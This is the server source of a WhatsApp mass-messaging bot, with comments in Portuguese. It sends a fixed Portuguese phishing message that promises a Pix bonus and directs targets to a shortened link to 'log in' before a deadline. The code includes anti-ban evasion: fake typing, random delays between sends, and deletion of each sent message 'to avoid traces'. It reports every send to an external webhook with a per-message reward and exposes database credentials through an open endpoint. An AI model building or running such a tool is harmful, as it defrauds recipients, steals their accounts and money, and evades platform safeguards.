import "dotenv/config";
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import makeWASocket, { 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    type WASocket,
    type ConnectionState
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client.ts";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

async function startServer() {
    const app = express();
    app.use(express.json());
    const PORT = 3000;

    let sock: WASocket | null = null;
    let pairingCode: string | null = null;
    let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";
    
    let version: any = [2, 3000, 1035194821];
    try {
        const latest = await fetchLatestBaileysVersion();
        version = latest.version;
    } catch (err) {
        console.warn("Aviso: Falha ao buscar última versão do Baileys. Usando fallback.", err);
    }

    // Inicializador da conexão com WhatsApp
    async function connectToWhatsApp() {
        const { state, saveCreds } = await useMultiFileAuthState("auth_info_baileys");

        sock = makeWASocket({
            version,
            logger,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            browser: Browsers.ubuntu("Chrome"),
            markOnlineOnConnect: true,
        });

        sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
            const { connection, lastDisconnect } = update;
            if (connection === "close") {
                const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                console.log("Conexão fechada devido a", lastDisconnect?.error, ", status code:", statusCode, ", reconectando:", shouldReconnect);
                connectionStatus = "close";

                if (sock) {
                    try {
                        sock.ev.removeAllListeners("connection.update");
                        sock.ev.removeAllListeners("creds.update");
                        sock.end(undefined);
                    } catch (e) {
                        console.error("Erro ao encerrar socket antigo no fechamento:", e);
                    }
                    sock = null;
                }

                // Reconexão se houver dados ativos salvos localmente
                const fs = await import("fs");
                const credsExist = fs.existsSync("auth_info_baileys/creds.json");
                if (shouldReconnect && credsExist) {
                    console.log("Credenciais ativas encontradas. Tentando reconectar em 5 segundos...");
                    await delay(5000);
                    connectToWhatsApp().catch(err => {
                        console.error("Erro ao reconectar ao WhatsApp:", err);
                    });
                } else {
                    console.log("Não reconectando: Sessão deslogada ou inexistente.");
                }
            } else if (connection === "open") {
                console.log("Conexão aberta com sucesso!");
                connectionStatus = "open";
                pairingCode = null;
            }
        });

        sock.ev.on("creds.update", saveCreds);
        return sock;
    }

    // Inicialização silenciosa de fundo se houver sessão
    import("fs").then((fs) => {
        if (fs.existsSync("auth_info_baileys/creds.json")) {
            console.log("Sessão ativa encontrada do WhatsApp. Conectando...");
            connectToWhatsApp().catch(err => {
                console.error("Erro ao iniciar conexão com WhatsApp:", err);
            });
        }
    });

    // Rota para Conexão Limpa e Geração de Código de Pareamento (Pairing Code)
    app.post("/api/connect", async (req, res) => {
        const { phone } = req.body;
        if (!phone) return res.status(400).json({ error: "Telefone é obrigatório" });
        const cleanPhone = phone.replace(/\D/g, "");

        try {
            console.log(`Iniciando processo de pareamento para o número: ${cleanPhone}`);
            
            if (sock) {
                try {
                    sock.ev.removeAllListeners("connection.update");
                    sock.ev.removeAllListeners("creds.update");
                    sock.end(undefined);
                } catch (e) {
                    console.error("Erro ao encerrar socket anterior:", e);
                }
            }

            // Exclusão completa da sessão anterior para evitar conflito de credenciais
            const fs = await import("fs");
            if (fs.existsSync("auth_info_baileys")) {
                try {
                    fs.rmSync("auth_info_baileys", { recursive: true, force: true });
                } catch (e) {
                    console.error("Erro ao remover pasta de credenciais:", e);
                }
            }

            sock = null;
            connectionStatus = "close";
            pairingCode = null;

            await connectToWhatsApp();
            await new Promise(resolve => setTimeout(resolve, 1500));

            if (!sock) {
                throw new Error("Não foi possível inicializar o socket do WhatsApp");
            }

            const code = await sock.requestPairingCode(cleanPhone);
            pairingCode = code || null;
            connectionStatus = "pairing";
            
            res.json({ pairingCode: code });
        } catch (error: any) {
            console.error("Erro ao gerar pairing code:", error);
            res.status(500).json({ error: "Erro ao gerar pairing code: " + error.message });
        }
    });

    // Rota de Desconexão e Logout Completo
    app.post("/api/disconnect", async (req, res) => {
        try {
            if (sock) {
                try {
                    sock.ev.removeAllListeners("connection.update");
                    sock.ev.removeAllListeners("creds.update");
                    sock.logout();
                    sock.end(undefined);
                } catch (e) {
                    console.error("Erro ao deslogar socket:", e);
                }
            }

            const fs = await import("fs");
            if (fs.existsSync("auth_info_baileys")) {
                try {
                    fs.rmSync("auth_info_baileys", { recursive: true, force: true });
                } catch (e) {
                    console.error("Erro ao excluir pasta de credenciais:", e);
                }
            }

            sock = null;
            pairingCode = null;
            connectionStatus = "close";
            res.json({ success: true });
        } catch (error: any) {
            console.error("Erro ao desconectar:", error);
            res.status(500).json({ error: "Erro ao desconectar: " + error.message });
        }
    });

    // Envio assíncrono do Webhook de retorno de disparos
    const triggerWebhook = async (status: string, target: string, messageId: string) => {
        const webhookUrl = process.env.WEBHOOK_URL;
        if (!webhookUrl) return;

        try {
            await axios.post(webhookUrl, {
                status,
                target,
                messageId,
                timestamp: new Date().toISOString(),
                reward: 0.10
            });
        } catch (err) {
            console.error("Erro ao disparar Webhook:", err);
        }
    };

    // Rota de Disparo em Massa com Algoritmo Humano/Antiban
    app.post("/api/disparar", async (req, res) => {
        const { targets } = req.body;
        
        if (!sock || connectionStatus !== "open") {
            return res.status(400).json({ error: "WhatsApp não conectado" });
        }

        if (!Array.isArray(targets) || targets.length === 0) {
            return res.status(400).json({ error: "Lista de alvos inválida" });
        }

        // Responde de imediato para liberar a fila no frontend
        res.json({ status: "queueing", count: targets.length });

        for (const targetRaw of targets) {
            try {
                const target = targetRaw.toString().replace(/\D/g, "") + "@s.whatsapp.net";
                
                // 1. Simulação de Digitando (Duração randômica entre 7 e 12 segundos)
                const typingDuration = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
                await sock.sendPresenceUpdate("composing", target);
                await delay(typingDuration);
                await sock.sendPresenceUpdate("paused", target);

                // 2. Envia a mensagem promocional fixa
                const sentMsg = await sock.sendMessage(target, { text: FIXED_MESSAGE });

                if (sentMsg) {
                    // 3. Limpeza Automática do Chat (Apaga histórico para evitar rastros)
                    await sock.chatModify({ 
                        delete: true, 
                        lastMessages: [{ key: sentMsg.key, messageTimestamp: sentMsg.messageTimestamp }] 
                    }, target);
                    
                    // 4. Dispara retorno via Webhook externo
                    await triggerWebhook("success", target, sentMsg.key.id || "");
                }

                // 5. Delay Humano Randômico (30 a 45 segundos) para segurança antiban
                const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
                console.log(`Mensagem enviada para ${target}. Aguardando ${nextDelay/1000}s para o próximo...`);
                await delay(nextDelay);

            } catch (err) {
                console.error(`Erro ao disparar para ${targetRaw}:`, err);
            }
        }
    });

    // Rota de busca dos contatos do banco PostgreSQL/Cloud SQL
    app.get("/api/contatos", async (req, res) => {
        try {
            const result = await getContactsFromDB();
            res.json(result);
        } catch (error: any) {
            console.error("Erro na rota /api/contatos:", error);
            res.status(500).json({ success: false, error: error.message || "Erro ao buscar contatos" });
        }
    });

    // Rota de importação em massa (via CSV do painel administrativo)
    app.post("/api/contatos/importar", async (req, res) => {
        const { phones } = req.body;
        if (!phones || !Array.isArray(phones)) {
            return res.status(400).json({ success: false, error: "Formato inválido. Array de 'phones' esperado." });
        }
        try {
            const result = await importContacts(phones);
            res.json(result);
        } catch (error: any) {
            console.error("Erro na rota /api/contatos/importar:", error);
            res.status(500).json({ success: false, error: error.message || "Erro ao importar contatos" });
        }
    });

    // Exposição segura de credenciais para verificação do Admin
    app.get("/api/db-credentials", (req, res) => {
        try {
            const creds = getDBCredentials();
            res.json(creds);
        } catch (error: any) {
            res.status(500).json({ success: false, error: error.message });
        }
    });

    app.get("/api/status", (req, res) => {
        res.json({ 
            status: connectionStatus, 
            pairingCode,
            connectedAs: sock?.authState.creds.me?.id 
        });
    });

    // Integração com Vite e Servidor Estático para produção
    if (process.env.NODE_ENV !== "production") {
        const vite = await createViteServer({
            server: { middlewareMode: true },
            appType: "spa",
        });
        app.use(vite.middlewares);
    } else {
        const distPath = path.join(process.cwd(), "dist");
        app.use(express.static(distPath));
        app.get("*", (req, res) => {
            res.sendFile(path.join(distPath, "index.html"));
        });
    }

    app.listen(PORT, "0.0.0.0", () => {
        console.log(`Servidor rodando em http://localhost:${PORT}`);
    });
}

startServer();
